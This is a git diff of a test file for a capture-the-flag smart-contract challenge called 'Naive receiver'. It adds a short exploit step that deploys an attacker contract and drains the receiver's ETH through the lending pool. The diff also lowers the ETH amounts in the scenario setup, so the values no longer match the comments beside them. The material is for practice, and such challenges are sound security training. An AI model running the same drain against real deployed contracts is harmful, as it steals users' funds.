@@ -5,10 +5,10 @@ describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
 
     // Pool has 1000 ETH in balance
-    const ETHER_IN_POOL = ethers.utils.parseEther('1000');
+    const ETHER_IN_POOL = ethers.utils.parseEther('100');
 
     // Receiver has 10 ETH in balance
-    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
+    const ETHER_IN_RECEIVER = ethers.utils.parseEther('1');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -31,6 +31,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+        const Attacker = await ethers.getContractFactory("AttackerNaiveReceiver");
+        const attackerContract = await Attacker.deploy(this.pool.address);
+        tx = await attackerContract.connect(attacker).attack(this.receiver.address);
+        await tx.wait();
+
     });
 
     after(async function () {
